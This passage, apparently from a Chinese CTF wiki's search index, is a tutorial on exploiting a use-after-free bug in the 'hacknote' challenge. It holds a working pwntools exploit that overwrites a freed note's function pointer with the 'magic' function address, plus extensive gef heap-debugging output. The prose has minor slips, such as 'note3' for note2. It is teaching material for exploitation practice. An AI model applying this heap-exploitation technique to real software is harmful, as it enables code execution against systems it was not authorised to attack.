            "text": "\u6211\u4eec\u53ef\u4ee5\u770b\u5230 Use After Free \u7684\u60c5\u51b5\u786e\u5b9e\u53ef\u80fd\u4f1a\u53d1\u751f\uff0c\u90a3\u4e48\u600e\u4e48\u53ef\u4ee5\u8ba9\u5b83\u53d1\u751f\u5e76\u4e14\u8fdb\u884c\u5229\u7528\u5462\uff1f\u9700\u8981\u540c\u65f6\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8fd8\u6709\u4e00\u4e2amagic\u51fd\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u901a\u8fc7use after free \u6765\u4f7f\u5f97\u8fd9\u4e2a\u7a0b\u5e8f\u6267\u884cmagic\u51fd\u6570\u5462\uff1f \u4e00\u4e2a\u5f88\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u4fee\u6539note\u7684put\u5b57\u6bb5\u4e3amagic\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u6267\u884cprint note \u7684\u65f6\u5019\u6267\u884cmagic\u51fd\u6570\u3002  \u90a3\u4e48\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f                                                                           \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u6765\u770b\u4e00\u4e0b\u6bcf\u4e00\u4e2anote\u751f\u6210\u7684\u5177\u4f53\u6d41\u7a0b   \u7a0b\u5e8f\u7533\u8bf78\u5b57\u8282\u5185\u5b58\u7528\u6765\u5b58\u653enote\u4e2d\u7684put\u4ee5\u53cacontent\u6307\u9488\u3002  \u7a0b\u5e8f\u6839\u636e\u8f93\u5165\u7684size\u6765\u7533\u8bf7\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u7136\u540e\u7528\u6765\u5b58\u50a8content\u3002    +-----------------+                       \n   |   put           |                       \n   +-----------------+                       \n   |   content       |       size              \n   +-----------------+------------------- +----------------+\n                                          |     real       |\n                                          |    content     |\n                                          |                |\n                                          +----------------+    \u90a3\u4e48\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5728\u5806\u7684\u5b9e\u73b0\u4e2d\u6240\u5b66\u5230\u7684\uff0c\u663e\u7136note\u662f\u4e00\u4e2afastbin chunk\uff08\u5927\u5c0f\u4e3a16\u5b57\u8282\uff09\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5e0c\u671b\u4e00\u4e2anote\u7684put\u5b57\u6bb5\u4e3amagic\u7684\u51fd\u6570\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u60f3\u529e\u6cd5\u8ba9\u67d0\u4e2anote\u7684put\u6307\u9488\u88ab\u8986\u76d6\u4e3amagic\u5730\u5740\u3002\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u53ea\u6709\u552f\u4e00\u7684\u5730\u65b9\u5bf9put\u8fdb\u884c\u8d4b\u503c\u3002\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5229\u7528\u5199real content\u7684\u65f6\u5019\u6765\u8fdb\u884c\u8986\u76d6\u3002\u5177\u4f53\u91c7\u7528\u7684\u601d\u8def\u5982\u4e0b   \u7533\u8bf7note0\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09  \u7533\u8bf7note1\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09  \u91ca\u653enote0  \u91ca\u653enote1  \u6b64\u65f6\uff0c\u5927\u5c0f\u4e3a16\u7684fast bin chunk\u4e2d\u94fe\u8868\u4e3anote1- note0  \u7533\u8bf7note2\uff0c\u5e76\u4e14\u8bbe\u7f6ereal content\u7684\u5927\u5c0f\u4e3a8\uff0c\u90a3\u4e48\u6839\u636e\u5806\u7684\u5206\u914d\u89c4\u5219  note2\u5176\u5b9e\u4f1a\u5206\u914dnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u3002  real content \u5bf9\u5e94\u7684chunk\u5176\u5b9e\u662fnote0\u3002  \u5982\u679c\u6211\u4eec\u8fd9\u65f6\u5019\u5411note3\u7684chunk\u90e8\u5206\u5199\u5165magic\u7684\u5730\u5740\uff0c\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u6ca1\u6709note1\u4e3aNULL\u3002\u5f53\u6211\u4eec\u518d\u6b21\u5c1d\u8bd5\u8f93\u51fanote1\u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8c03\u7528magic\u51fd\u6570\u3002", 
            "title": "\u5229\u7528\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_5", 
            "text": "#!/usr/bin/env python  # -*- coding: utf-8 -*-  from   pwn   import   *  r   =   process ( ./hacknote )  def   addnote ( size ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 1 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( size )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   delnote ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 2 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  def   printnote ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 3 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  #gdb.attach(r)  magic   =   0x08048986  addnote ( 32 ,   aaaa )   # add note 0  addnote ( 32 ,   ddaa )   # add note 1  delnote ( 0 )   # delete note 0  delnote ( 1 )   # delete note 1  addnote ( 8 ,   p32 ( magic ))   # add note 2  printnote ( 0 )   # print note 0  r . interactive ()   \u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u770b\u4e00\u4e0b\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u9996\u5148\u5148\u4e0b\u65ad\u70b9  \u4e24\u5904malloc\u4e0b\u65ad\u70b9  gef\u27a4  b *0x0804875C\nBreakpoint  1  at 0x804875c\ngef\u27a4  b *0x080486CA\nBreakpoint  2  at 0x80486ca  \u4e24\u5904free\u4e0b\u65ad\u70b9  gef\u27a4  b *0x08048893\nBreakpoint  3  at 0x8048893\ngef\u27a4  b *0x080488A9\nBreakpoint  4  at 0x80488a9  \u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7533\u8bf7note0\u65f6\uff0c\u6240\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5757\u5730\u5740\u4e3a0x0804b008\u3002\uff08eax\u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u503c\uff09  $eax     :   0x0804b008    \u2192    0x00000000  $ebx     :   0x00000000  $ecx     :   0xf7fac780    \u2192    0x00000000  $edx     :   0x0804b008    \u2192    0x00000000  $esp     :   0xffffcf10    \u2192    0x00000008  $ebp     :   0xffffcf48    \u2192    0xffffcf68    \u2192    0x00000000  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xf7fac000    \u2192    0x001b1db0  $eip     :   0x080486cf    \u2192    add_note + 89   add   esp ,   0x10  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   zero   SIGN   trap   INTERRUPT   direction   overflow   resume   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500 \n     0 x80486c2   add_note + 76      add      DWORD   PTR   [ eax ],   eax \n     0 x80486c4   add_note + 78      add      BYTE   PTR   [ ebx + 0x86a0cec ],   al \n     0 x80486ca   add_note + 84      call     0x80484e0   malloc@plt \n  \u2192    0 x80486cf   add_note + 89      add      esp ,   0x10 \n     0 x80486d2   add_note + 92      mov      edx ,   eax \n     0 x80486d4   add_note + 94      mov      eax ,   DWORD   PTR   [ ebp-0x1c ] \n     0 x80486d7   add_note + 97      mov      DWORD   PTR   [ eax * 4 + 0x804a070 ],   edx  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcf10 ,   l8 ]  8  0 xffffcf10 \u2502+ 0x00 :   0x00000008       \u2190   $esp  0 xffffcf14 \u2502+ 0x04 :   0x00000000  0 xffffcf18 \u2502+ 0x08 :   0xf7e29ef5    \u2192    strtol + 5   add   eax ,   0x18210b  0 xffffcf1c \u2502+ 0x0c :   0xf7e27260    \u2192    atoi + 16   add   esp ,   0x1c  0 xffffcf20 \u2502+ 0x10 :   0xffffcf58    \u2192    0xffff0a31    \u2192    0x00000000  0 xffffcf24 \u2502+ 0x14 :   0x00000000  0 xffffcf28 \u2502+ 0x18 :   0x0000000a  0 xffffcf2c \u2502+ 0x1c :   0x00000000  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  --- Type   return   to   continue ,   or   q   return   to   quit---  [ #0] 0x80486cf \u2192 Name: add_note()  [ #1] 0x8048ac5 \u2192 Name: main()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    heap   chunk   0x0804b008  UsedChunk ( addr = 0x804b008 ,   size = 0x10 )  Chunk   size :   16   ( 0x10 )  Usable   size :   12   ( 0xc )  Previous   chunk   size :   0   ( 0x0 )  PREV_INUSE   flag :   On  IS_MMAPPED   flag :   Off  NON_MAIN_ARENA   flag :   Off   \u7533\u8bf7note 0\u7684content\u7684\u5730\u5740\u4e3a0x0804b018  $eax     :   0x0804b018    \u2192    0x00000000  $ebx     :   0x0804b008    \u2192    0x0804865b    \u2192    print_note_content + 0   push   ebp  $ecx     :   0xf7fac780    \u2192    0x00000000  $edx     :   0x0804b018    \u2192    0x00000000  $esp     :   0xffffcf10    \u2192    0x00000020  $ebp     :   0xffffcf48    \u2192    0xffffcf68    \u2192    0x00000000  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xf7fac000    \u2192    0x001b1db0  $eip     :   0x08048761    \u2192    add_note + 235   add   esp ,   0x10  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   ZERO   sign   trap   INTERRUPT   direction   overflow   resume   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500 \n     0 x8048752   add_note + 220     mov      al ,   ds : 0x458b0804 \n     0 x8048757   add_note + 225     call     0x581173df \n     0 x804875c   add_note + 230     call     0x80484e0   malloc@plt \n  \u2192    0 x8048761   add_note + 235     add      esp ,   0x10 \n     0 x8048764   add_note + 238     mov      DWORD   PTR   [ ebx + 0x4 ],   eax \n     0 x8048767   add_note + 241     mov      eax ,   DWORD   PTR   [ ebp-0x1c ] \n     0 x804876a   add_note + 244     mov      eax ,   DWORD   PTR   [ eax * 4 + 0x804a070 ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcf10 ,   l8 ]  8  0 xffffcf10 \u2502+ 0x00 :   0x00000020       \u2190   $esp  0 xffffcf14 \u2502+ 0x04 :   0xffffcf34    \u2192    0xf70a3233  0 xffffcf18 \u2502+ 0x08 :   0x00000008  0 xffffcf1c \u2502+ 0x0c :   0xf7e27260    \u2192    atoi + 16   add   esp ,   0x1c  0 xffffcf20 \u2502+ 0x10 :   0xffffcf58    \u2192    0xffff0a31    \u2192    0x00000000  0 xffffcf24 \u2502+ 0x14 :   0x00000000  0 xffffcf28 \u2502+ 0x18 :   0x0000000a  0 xffffcf2c \u2502+ 0x1c :   0x00000000  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  --- Type   return   to   continue ,   or   q   return   to   quit---  [ #0] 0x8048761 \u2192 Name: add_note()  [ #1] 0x8048ac5 \u2192 Name: main()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    heap   chunk   0x0804b018  UsedChunk ( addr = 0x804b018 ,   size = 0x28 )  Chunk   size :   40   ( 0x28 )  Usable   size :   36   ( 0x24 )  Previous   chunk   size :   0   ( 0x0 )  PREV_INUSE   flag :   On  IS_MMAPPED   flag :   Off  NON_MAIN_ARENA   flag :   Off   \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230note1\u7684\u5730\u5740\u4ee5\u53ca\u5176content\u7684\u5730\u5740\u5206\u522b\u4e3a0x0804b040 \u548c0x0804b050\u3002  \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230note0\u4e0enote1\u5bf9\u5e94\u7684content\u786e\u5b9e\u662f\u76f8\u5e94\u7684\u5185\u5b58\u5757\u3002  gef \u27a4    grep   aaaa  [+]   Searching   aaaa   in   memory  [+]   In   [ heap ] ( 0x804b000 - 0x806c000 ),   permission = rw- \n   0 x804b018   -   0x804b01c    \u2192     aaaa   gef \u27a4    grep   ddaa  [+]   Searching   ddaa   in   memory  [+]   In   [ heap ] ( 0x804b000 - 0x806c000 ),   permission = rw- \n   0 x804b050   -   0x804b054    \u2192     ddaa    \u4e0b\u9762\u5c31\u662ffree\u7684\u8fc7\u7a0b\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u53d1\u73b0\u9996\u5148\uff0cnote0\u7684content\u88abfree    \u2192    0 x8048893   del_note + 143     call     0x80484c0   free@plt \n    \u21b3     0 x80484c0   free@plt + 0       jmp      DWORD   PTR   ds : 0x804a018 \n        0 x80484c6   free@plt + 6       push     0x18 \n        0 x80484cb   free@plt + 11      jmp      0x8048480 \n        0 x80484d0   __stack_chk_fail@plt + 0   jmp      DWORD   PTR   ds : 0x804a01c  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcf20 ,   l8 ]  8  0 xffffcf20 \u2502+ 0x00 :   0x0804b018    \u2192    aaaa    \u2190   $esp   \u7136\u540e\u662fnote0\u672c\u8eab    \u2192    0 x80488a9   del_note + 165     call     0x80484c0   free@plt \n    \u21b3     0 x80484c0   free@plt + 0       jmp      DWORD   PTR   ds : 0x804a018 \n        0 x80484c6   free@plt + 6       push     0x18 \n        0 x80484cb   free@plt + 11      jmp      0x8048480 \n        0 x80484d0   __stack_chk_fail@plt + 0   jmp      DWORD   PTR   ds : 0x804a01c  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcf20 ,   l8 ]  8  0 xffffcf20 \u2502+ 0x00 :   0x0804b008    \u2192    0x0804865b    \u2192    print_note_content + 0   push   ebp    \u2190   $esp   \u5f53delete\u7ed3\u675f\u540e\uff0c\u6211\u4eec\u89c2\u770b\u4e00\u4e0bbins\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5176\u88ab\u5b58\u653e\u5728\u5bf9\u5e94\u7684fast bin\u4e2d\uff0c  gef \u27a4    heap   bins  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [   Fastbins   for   arena   0xf7fac780   ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  Fastbins [ idx = 0 ,   size = 0x8 ]    \u2190    UsedChunk ( addr = 0x804b008 ,   size = 0x10 )   Fastbins [ idx = 1 ,   size = 0xc ]   0x00  Fastbins [ idx = 2 ,   size = 0x10 ]   0x00  Fastbins [ idx = 3 ,   size = 0x14 ]    \u2190    UsedChunk ( addr = 0x804b018 ,   size = 0x28 )   Fastbins [ idx = 4 ,   size = 0x18 ]   0x00  Fastbins [ idx = 5 ,   size = 0x1c ]   0x00  Fastbins [ idx = 6 ,   size = 0x20 ]   0x00   \u5f53\u6211\u4eec\u5c06note1\u4e5f\u5168\u90e8\u5220\u9664\u5b8c\u6bd5\u540e\uff0c\u518d\u6b21\u89c2\u770bbins\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u5220\u9664\u7684chunk\u5757\u786e\u5b9e\u5904\u4e8e\u8868\u5934\u3002  gef \u27a4    heap   bins  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   Fastbins   for   arena   0xf7fac780   ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  Fastbins [ idx = 0 ,   size = 0x8 ]    \u2190    UsedChunk ( addr = 0x804b040 ,   size = 0x10 )    \u2190    UsedChunk ( addr = 0x804b008 ,   size = 0x10 )   Fastbins [ idx = 1 ,   size = 0xc ]   0x00  Fastbins [ idx = 2 ,   size = 0x10 ]   0x00  Fastbins [ idx = 3 ,   size = 0x14 ]    \u2190    UsedChunk ( addr = 0x804b050 ,   size = 0x28 )    \u2190    UsedChunk ( addr = 0x804b018 ,   size = 0x28 )   Fastbins [ idx = 4 ,   size = 0x18 ]   0x00  Fastbins [ idx = 5 ,   size = 0x1c ]   0x00  Fastbins [ idx = 6 ,   size = 0x20 ]   0x00   \u90a3\u4e48\uff0c\u6b64\u65f6\u5373\u5c06\u8981\u7533\u8bf7note2\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e0bnote2\u90fd\u7533\u8bf7\u5230\u4e86\u4ec0\u4e48\u5185\u5b58\u5757\uff0c\u5982\u4e0b  